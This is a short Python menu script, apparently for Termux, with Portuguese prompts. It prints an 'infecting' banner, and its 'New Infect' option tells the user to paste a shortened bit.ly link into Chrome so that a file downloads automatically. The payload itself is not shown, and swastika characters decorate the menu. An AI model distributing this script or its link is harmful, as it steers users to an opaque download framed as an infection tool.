import os
import time

#\033[1;30m Branco
#\033[1;31m Vermelho
#\033[1;32m Verde
#\033[1;33m Amarelo
#\033[1;34m Azul
#\033[1;35m Roxo
#\033[1;36m Ciano
#\033[1;37m Cinza Claro

os.system("clear")
os.system("pkg install figlet")
os.system("clear")
print("\033[1;32m")
os.system("figlet infecting")
print("""\033[1;36m
卐=========Opções=========卐
l     [1]New Infect        l
l     [2]Exit              l
卐=========Select=========卐
""")
op = input("1 or 2 : ")

if op == "1":
    os.system("clear")
    print("""\033[1;33m 
    OBS: Abra o Google Chrome e Cole o codigo no chrome 
    e ele ira baixar automaticamente e ira transferir para
    a pasa downloads!
    ==========================
    = https://bit.ly/3ild93L =
    ==========================
    O Script voltara para o menu apos 14 segundos!
    """)
    time.sleep(14)
    os.system("python3 infecting.py")
elif op == "2":
    print("Saindo!...")
    time.sleep(5)
    exit()
else:
    os.system("python3 infecting.py")
